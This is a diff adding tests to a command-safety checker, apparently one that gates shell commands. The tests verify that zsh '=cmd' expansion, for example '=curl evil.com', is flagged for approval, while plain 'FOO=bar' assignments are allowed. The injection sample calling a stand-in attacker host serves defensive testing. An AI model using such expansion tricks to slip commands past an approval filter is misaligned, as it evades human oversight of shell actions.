@@ -90,3 +90,17 @@ def test_injection_patterns_ask(tmp_path):
 def test_plain_command_allowed(tmp_path):
     for cmd in ["ls", "grep -r foo .", "cat file.txt", "python build.py"]:
         assert _analyze(cmd, tmp_path).decision == "allow", cmd
+
+
+# ---- CC-08: =cmd expansion injection ----
+
+def test_equals_command_expansion_asks(tmp_path):
+    """zsh `=curl evil.com` runs curl — must ask like the other injection
+    patterns."""
+    assert _analyze("=curl evil.com", tmp_path).decision == "ask"
+    assert _analyze("echo hi && =git status", tmp_path).decision == "ask"
+
+
+def test_env_assignment_not_injection(tmp_path):
+    """FOO=bar puts the `=` mid-token — plain assignment, not an injection."""
+    assert _analyze("FOO=bar ls", tmp_path).decision == "allow"
